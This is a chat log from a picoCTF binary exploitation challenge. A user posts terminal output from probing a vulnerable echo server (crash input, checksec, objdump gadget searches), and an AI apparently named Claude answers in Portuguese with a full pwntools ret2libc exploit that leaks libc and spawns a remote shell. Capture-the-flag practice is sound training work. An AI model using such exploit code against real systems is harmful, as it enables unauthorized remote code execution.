Here's a LIBC el offset es de 136
Binary ExploitationHard90 pts2,387 solves
by madStacks
I am once again asking for you to pwn this binary

```
      ~/Work  nc wily-courier.picoctf.net 51819                                                                                                  ✔ 
WeLcOmE To mY EcHo sErVeR!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
Segmentation fault (core dumped)
                                                                                                                                                         
      ~/Work  mv ../Downloads/libc.so.6 .                                                                                               ✔  13s   
                                                                                                                                                         
      ~/Work  mv ../Downloads/Makefile.share .                                                                                                   ✔ 
                                                                                                                                                         
      ~/Work  mv ../Downloads/vuln .                                                                                                             ✔ 
                                                                                                                                                         
      ~/Work  checksec --file=vuln                                                                                                               ✔ 
[*] '/home/kali/Work/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./'
    Stripped:   No
                                                                                                                                                         
      ~/Work     



      ~/Work  objdump -d ./vuln | grep -B 1 "ret" | grep -A 1 "pop"                                                                              ✔ 
  4005f8:       5d                      pop    %rbp
  4005f9:       c3                      ret
--
  400638:       5d                      pop    %rbp
  400639:       c3                      ret
--
  400659:       5d                      pop    %rbp
  40065a:       c3                      ret
--
  4006d6:       5d                      pop    %rbp
  4006d7:       c3                      ret
--
  400912:       41 5f                   pop    %r15
  400914:       c3                      ret
 python3 -c "data = open('./vuln', 'rb').read(); print(f'[+] Gadget pop rdi; ret encontrado en: {hex(data.find(b'\x5f\xc3'))}')"    ✔ 
[+] Gadget pop rdi; ret encontrado en: 0x913
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep -A 10 "__libc_csu_init" | grep -B 1 "ret"                                                                 ✔ 
  400912:       41 5f                   pop    %r15
  400914:       c3                      ret
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep "ret" | head -n 1                                                                                         ✔ 
  40052e:       c3                      ret
                         ~/Work  objdump -d ./vuln | grep "@plt>:"                                                                                                  ✔ 
0000000000400540 <puts@plt>:
0000000000400550 <setresgid@plt>:
0000000000400560 <setbuf@plt>:
0000000000400570 <getegid@plt>:
0000000000400580 <__isoc99_scanf@plt>:
objdump -d ./vuln | grep -B 1 "ret" | grep "pop"                                                                                   ✔ 
  4005f8:       5d                      pop    %rbp
  400638:       5d                      pop    %rbp
  400659:       5d                      pop    %rbp
  4006d6:       5d                      pop    %rbp
  400912:       41 5f                   pop    %r15
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep -A 25 "<__libc_csu_init>:"                                                                                ✔ 
00000000004008b0 <__libc_csu_init>:
  4008b0:       41 57                   push   %r15
  4008b2:       41 56                   push   %r14
  4008b4:       49 89 d7                mov    %rdx,%r15
  4008b7:       41 55                   push   %r13
  4008b9:       41 54                   push   %r12
  4008bb:       4c 8d 25 3e 05 20 00    lea    0x20053e(%rip),%r12        # 600e00 <__frame_dummy_init_array_entry>
  4008c2:       55                      push   %rbp
  4008c3:       48 8d 2d 3e 05 20 00    lea    0x20053e(%rip),%rbp        # 600e08 <__do_global_dtors_aux_fini_array_entry>
  4008ca:       53                      push   %rbx
  4008cb:       41 89 fd                mov    %edi,%r13d
  4008ce:       49 89 f6                mov    %rsi,%r14
  4008d1:       4c 29 e5                sub    %r12,%rbp
  4008d4:       48 83 ec 08             sub    $0x8,%rsp
  4008d8:       48 c1 fd 03             sar    $0x3,%rbp
  4008dc:       e8 37 fc ff ff          call   400518 <_init>
  4008e1:       48 85 ed                test   %rbp,%rbp
  4008e4:       74 20                   je     400906 <__libc_csu_init+0x56>
  4008e6:       31 db                   xor    %ebx,%ebx
  4008e8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  4008ef:       00 
  4008f0:       4c 89 fa                mov    %r15,%rdx
  4008f3:       4c 89 f6                mov    %r14,%rsi
  4008f6:       44 89 ef                mov    %r13d,%edi
  4008f9:       41 ff 14 dc             call   *(%r12,%rbx,8)
  4008fd:       48 83 c3 01             add    $0x1,%rbx
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep -A 15 "add    \$0x1,%rbx"                                                                                 ✔ 
  4008fd:       48 83 c3 01             add    $0x1,%rbx
  400901:       48 39 dd                cmp    %rbx,%rbp
  400904:       75 ea                   jne    4008f0 <__libc_csu_init+0x40>
  400906:       48 83 c4 08             add    $0x8,%rsp
  40090a:       5b                      pop    %rbx
  40090b:       5d                      pop    %rbp
  40090c:       41 5c                   pop    %r12
  40090e:       41 5d                   pop    %r13
  400910:       41 5e                   pop    %r14
  400912:       41 5f                   pop    %r15
  400914:       c3                      ret
  400915:       90                      nop
  400916:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  40091d:       00 00 00 
0000000000400920 <__libc_csu_fini>:
                                                                 ~/Work  objdump -d ./vuln | grep -E "pop"                                                                                                  ✔ 
  400595:       5e                      pop    %rsi
  4005eb:       5d                      pop    %rbp
  4005f8:       5d                      pop    %rbp
  40062d:       5d                      pop    %rbp
  400638:       5d                      pop    %rbp
  400659:       5d                      pop    %rbp
  400674:       5d                      pop    %rbp
  4006d6:       5d                      pop    %rbp
  40090a:       5b                      pop    %rbx
  40090b:       5d                      pop    %rbp
  40090c:       41 5c                   pop    %r12
  40090e:       41 5d                   pop    %r13
  400910:       41 5e                   pop    %r14
  400912:       41 5f                   pop    %r15
                                                          objdump -d ./vuln | grep -A 20 "call" | grep -E "plt"                                                                              ✔ 
Disassembly of section .plt:
0000000000400530 <.plt>:
0000000000400540 <puts@plt>:
  40054b:       e9 e0 ff ff ff          jmp    400530 <.plt>
0000000000400550 <setresgid@plt>:
  40055b:       e9 d0 ff ff ff          jmp    400530 <.plt>
  4006fe:       e8 7d fe ff ff          call   400580 <__isoc99_scanf@plt>
  400719:       e8 62 fe ff ff          call   400580 <__isoc99_scanf@plt>
  400769:       e8 d2 fd ff ff          call   400540 <puts@plt>
  400797:       e8 c4 fd ff ff          call   400560 <setbuf@plt>
  40079c:       e8 cf fd ff ff          call   400570 <getegid@plt>
  4007b6:       e8 95 fd ff ff          call   400550 <setresgid@plt>
  400891:       e8 aa fc ff ff          call   400540 <puts@plt>
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep "<" | grep ">:"                                                                                           ✔ 
0000000000400518 <_init>:
0000000000400530 <.plt>:
0000000000400540 <puts@plt>:
0000000000400550 <setresgid@plt>:
0000000000400560 <setbuf@plt>:
0000000000400570 <getegid@plt>:
0000000000400580 <__isoc99_scanf@plt>:
0000000000400590 <_start>:
00000000004005c0 <_dl_relocate_static_pie>:
00000000004005d0 <deregister_tm_clones>:
0000000000400600 <register_tm_clones>:
0000000000400640 <__do_global_dtors_aux>:
0000000000400670 <frame_dummy>:
0000000000400677 <convert_case>:
00000000004006d8 <do_stuff>:
0000000000400771 <main>:
00000000004008b0 <__libc_csu_init>:
0000000000400920 <__libc_csu_fini>:
0000000000400924 <_fini>:
                                                                                                                                                         
      ~/Work  objdump -d ./vuln | grep -B 3 "call.*puts"                                                                                         ✔ 
  400760:       76 c6                   jbe    400728 <do_stuff+0x50>
  400762:       48 8d 45 80             lea    -0x80(%rbp),%rax
  400766:       48 89 c7                mov    %rax,%rdi
  400769:       e8 d2 fd ff ff          call   400540 <puts@plt>
--
  400888:       72 c3                   jb     40084d <main+0xdc>
  40088a:       48 8b 45 b8             mov    -0x48(%rbp),%rax
  40088e:       48 89 c7                mov    %rax,%rdi
  400891:       e8 aa fc ff ff          call   400540 <puts@plt>
```

2:11 AMClaude responded: Este é um ret2libc clássico!Este é um ret2libc clássico! Temos:

Offset: 136
No canary, no PIE
NX enabled (sem shellcode)
puts@plt para leak de libc
libc.so.6 fornecida

O plano:

Usar ROP para chamar puts(puts@got) → vazar endereço de puts na libc
Calcular base da libc
Chamar system("/bin/sh")

Script
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Gadgets
pop_rdi     = 0x400913  # pop rdi; ret (offset 0x913 no binario)
ret_gadget  = 0x40052e  # ret (para alinhar stack)
puts_plt    = elf.plt['puts']
puts_got    = elf.got['puts']
main_addr   = elf.symbols['main']

offset = 136

def exploit(p):
    # === FASE 1: Leak puts da libc ===
    payload  = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main_addr)  # retorna ao main para fase 2

    p.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
    p.sendline(payload)
    p.recvline()  # eco do input

    # Receber leak
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.success(f"puts leak: {hex(leak)}")

    # Calcular base da libc
    libc.address = leak - libc.symbols['puts']
    log.success(f"libc base: {hex(libc.address)}")

    # === FASE 2: system("/bin/sh") ===
    bin_sh  = next(libc.search(b'/bin/sh'))
    system  = libc.symbols['system']
    log.success(f"/bin/sh: {hex(bin_sh)}")
    log.success(f"system:  {hex(system)}")

    payload2  = b'A' * offset
    payload2 += p64(ret_gadget)   # alinhar stack para SSE
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh)
    payload2 += p64(system)

    p.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
    p.sendline(payload2)
    p.recvline()

    p.interactive()

# Testar local
# p = process('./vuln')

# Remoto
p = remote('wily-courier.picoctf.net', 51819)
exploit(p)
```
